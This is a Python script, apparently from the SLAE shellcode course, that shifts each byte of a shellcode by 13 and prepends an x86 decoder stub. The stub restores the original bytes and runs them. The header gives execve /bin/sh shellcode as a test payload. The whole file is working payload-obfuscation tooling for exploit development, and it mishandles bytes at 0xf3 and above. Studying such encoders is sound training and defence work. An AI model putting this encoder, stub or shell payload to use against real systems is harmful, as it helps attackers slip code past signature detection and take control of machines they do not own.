# Name: shellcode_encoder.py
# Author: Upayan a.k.a slaeryan
# SLAE: 1525
# Contact: upayansaha@icloud.com
# Purpose: The script takes a shellcode hex string, converts it into a ROT-13 
# encoded shellcode hex string and byte string, adds a decoder stub to it for 
# decoding and executing the original shellcode and then prints it out to stdout 
# alongwith length of original and encoded shellcode.
# Testing: 31c050682f2f7368682f62696e89e35089e25389e1b00bcd80 (execve /bin/sh)
# Run with:
# python3 shellcode_encoder.py
# Note: The original shellcode cannot contain null-bytes(0x00)


def main():
	decoder_stub = "eb095e802e0d740846ebf8e8f2ffffff"
	shellcode_hex = input("Enter the shellcode hex string: ")
	counter = 1
	byte = ''
	encoded_shellcode = ''
	for i in shellcode_hex:
		if (counter % 2 == 0):
			byte = byte + i
			byte = int(byte,16)
			byte = hex(byte+13)
			if(len(byte)==3):
				byte = byte[:2] + '0' + byte[2:]
			byte = byte[2:]
			print(byte)
			encoded_shellcode = encoded_shellcode + byte
			byte = ''
		else:
			byte = byte + i
		counter += 1
	encoded_shellcode = encoded_shellcode + "0d"
	output_shellcode = decoder_stub + encoded_shellcode
	print("\n")
	print("The ROT-13 encoded shellcode hex string is:", output_shellcode)
	print("\n")
	output_shellcode_byte_string = ''
	counter = 1
	byte = ''
	for i in output_shellcode:
		if (counter % 2 == 0):
			byte = "\\x" + byte + i
			output_shellcode_byte_string = output_shellcode_byte_string + byte
			byte = ''
		else:
			byte = byte + i
		counter += 1
	print("The ROT-13 encoded shellcode byte string is:", output_shellcode_byte_string)
	print("\n")
	encoded_length = len(output_shellcode)/2
	original_length = (encoded_length - (16 + 1))
	print("Length of original shellcode:", int(original_length))
	print("Length of encoded shellcode:", int(encoded_length))


main()
	
	
